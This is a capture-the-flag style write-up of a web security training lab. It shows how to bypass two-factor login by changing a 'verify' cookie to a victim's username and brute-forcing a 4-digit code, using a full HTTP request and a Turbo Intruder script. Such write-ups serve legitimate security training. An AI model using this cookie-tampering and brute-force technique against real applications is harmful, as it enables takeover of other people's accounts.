---
title: 2FA broken logic
category: Authentication
difficulty: Practitioner
tags:
  - authentication-failures
  - 2fa
  - brute-force
---
The goal of this lab is to use the 2FA system to log in as a different user. Earlier theory lessons in Paths mention that the application might not verify, whether the same user is performing the first and second step - it might use a cookie to distinguish that. We can manipulate the cookie to change the username at the second step and potentially brute-force the 2FA code to log in as a different user without ever knowing their password.

The victim's username is `carlos` and our credentials are `wiener:peter`.
Let's log in first to our account. After providing the credentials, we are asked for a 2FA code provided in the email:
![[2fa-broken-logic-img1.png]]

What is important is that the 2FA code is only 4 digits, therefore there are a maximum of 10000 possible combinations. If the application does not have any rate-limiting or brute-force protection at the second step, we might easily get access to a different account.

Checking the login process with Burp - first the login page with username and password:
![[2fa-broken-logic-img2.png]]

We can notice a `Set-Cookie: verify=wiener` header, which is the application's way to distinguish between different users at the second authentication step. This information should be bound to the generated session id and not available to the user.

A very important step is to change the cookie value **before** sending the `GET` request for `/login2`. The application will generate the 2FA code for the user provided in the cookie, therefore it is not enough to only change the cookie value for `POST /login2`.

The second authentication step:
![[2fa-broken-logic-img3.png]]

Now, we need to check whether the application does check the user only by the cookie value or not. The easiest way to get a valid request would be to use the browser and turn on Intercept before sending the 2FA code. Then we can send the request to Intruder (not recommended with Burp Community, might be very slow for 10000 requests) or Turbo Intruder, which I will use.

The HTTP request skeleton is:
```http
POST /login2 HTTP/2
Host: 0a(...)b6.web-security-academy.net
Cookie: verify=carlos; session=2w(...)ib
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0a(...)b6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a(...)b6.web-security-academy.net/login2
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

mfa-code=%s
```

Note that the username in the `verify` cookie is `carlos`, not `wiener`. We need to brute the 2FA code which is always 4 digits.

The Turbo Intruder script is:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )
    for i in range(10000):
	    mfa_code = str(i).zfill(4) #important - we need 4 digits
	    engine.queue(target.req, mfa_code)
	    
def handleResponse(req, interesting):
    table.add(req)
```

The valid 2FA code was quickly found with Turbo Intruder:
![[2fa-broken-logic-img4.png]]


